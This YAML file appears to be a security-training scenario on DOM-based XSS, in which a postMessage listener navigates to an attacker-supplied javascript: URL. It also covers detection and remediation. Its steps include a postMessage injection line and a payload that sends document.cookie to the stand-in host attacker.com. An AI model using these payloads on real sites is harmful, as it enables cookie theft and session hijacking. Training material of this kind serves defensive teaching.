# Category: DOM-based Vulnerabilities
name: "DOM XSS using web messages and a JavaScript URL"
id: "dom-xss-web-messages-js-url-001"
category: "dom_based"
subcategory: "web_messages"
difficulty: "practitioner"
estimated_time: "45 minutes"

description: |
  This scenario covers DOM-based XSS where the application receives a message
  via postMessage and then navigates to a URL provided in the message. The
  attacker can send a `javascript:` URL that executes when the navigation occurs.

learning_objectives:
  - Understand postMessage with navigation sinks
  - Identify where message data is used in window.location or similar
  - Inject a javascript: URL via postMessage
  - Execute JavaScript in the context of the target page

tools:
  - Burp Suite
  - Browser developer tools

prerequisites:
  - Target page has a message listener that navigates to a URL from the message
  - No validation of the URL protocol

steps:
  - id: "step1"
    phase: "reconnaissance"
    action: "Identify message listener that navigates"
    commands:
      - "# Look for: window.location = event.data"
      - "# Or: window.open(event.data)"
    expected_output: "Message data is used for navigation"
    detection: "None"

  - id: "step2"
    phase: "exploitation"
    action: "Send a javascript: URL via postMessage"
    commands:
      - "# Payload: javascript:alert('XSS')"
      - "# Send via postMessage:"
      - "iframe.contentWindow.postMessage('javascript:alert(\"XSS\")', '*');"
    expected_output: "When the message is received, the javascript: URL executes"
    detection: "Web server logs may show the message"

  - id: "step3"
    phase: "post_exploitation"
    action: "Exfiltrate data via the javascript: URL"
    commands:
      - "# Payload: javascript:document.location='http://attacker.com/steal?cookie='+document.cookie"
    expected_output: "Cookie sent to attacker"
    detection: "Attacker server logs"

compliance_controls:
  - standard: "MITRE ATT&CK"
    control: "T1189"
    description: "Drive-by Compromise"
  - standard: "OWASP"
    control: "A03:2021"
    description: "Injection"

detection:
  network_indicators:
    - "postMessage with javascript: scheme"
  log_indicators:
    - "Navigation events from postMessage"
  endpoint_indicators:
    - "None"

remediation:
  immediate:
    - "Validate event.origin and message content"
    - "Do not navigate to user-controlled URLs"
  long_term:
    - "Use a whitelist of allowed URLs"
    - "Implement CSP to block javascript: URLs"

variables:
  target_url: "https://target.com/vulnerable-page"
  payload: "javascript:alert('XSS')"

assessment_questions:
  - "Why are javascript: URLs dangerous in navigation contexts?"
  - "How can you validate URLs before navigation?"
  - "What is the best defense against this type of attack?"

references:
  - url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"
    title: "MDN postMessage"
  - url: "https://portswigger.net/web-security/dom-based/xss-using-web-messages"
    title: "PortSwigger Web Messages"